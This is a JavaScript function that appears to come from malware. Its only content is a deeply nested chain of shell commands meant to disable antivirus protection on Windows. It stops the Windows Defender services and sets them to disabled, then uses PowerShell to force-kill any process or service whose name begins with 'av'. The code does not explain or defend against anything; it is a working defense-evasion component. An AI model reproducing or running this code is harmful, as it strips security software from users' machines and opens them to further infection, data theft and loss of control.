// Function to disable antivirus and other security software with additional methods
function disableantivirus() {
    exec('sc stop WinDefend', (error) => {
        if (error) {
            console.error('Error stopping service:', error);
        } else {
            exec('sc config WinDefend start= disabled', (error) => {
                if (error) {
                    console.error('Error configuring service:', error);
                } else {
                    exec('sc stop MpSigStub', (error) => {
                        if (error) {
                            console.error('Error stopping service:', error);
                        } else {
                            exec('sc config MpSigStub start= disabled', (error) => {
                                if (error) {
                                    console.error('Error configuring service:', error);
                                } else {
                                    exec('sc stop MsMpEng', (error) => {
                                        if (error) {
                                            console.error('Error stopping service:', error);
                                        } else {
                                            exec('sc config MsMpEng start= disabled', (error) => {
                                                if (error) {
                                                    console.error('Error configuring service:', error);
                                                } else {
                                                    exec('powershell -Command "Get-Process | Where-Object { $_.Name -like \'av*\' } | Stop-Process -Force"', (error) => {
                                                        if (error) {
                                                            console.error('Error stopping processes:', error);
                                                        } else {
                                                            exec('powershell -Command "Get-Service | Where-Object { $_.Name -like \'av*\' } | Stop-Service -Force"', (error) => {
                                                                if (error) {
                                                                    console.error('Error stopping services:', error);
                                                                }
                                                            });
                                                        }
                                                    });
                                                }
                                            });
                                        }
                                    });
                                }
                            });
                        }
                    });
                }
            });
        }
    });
}

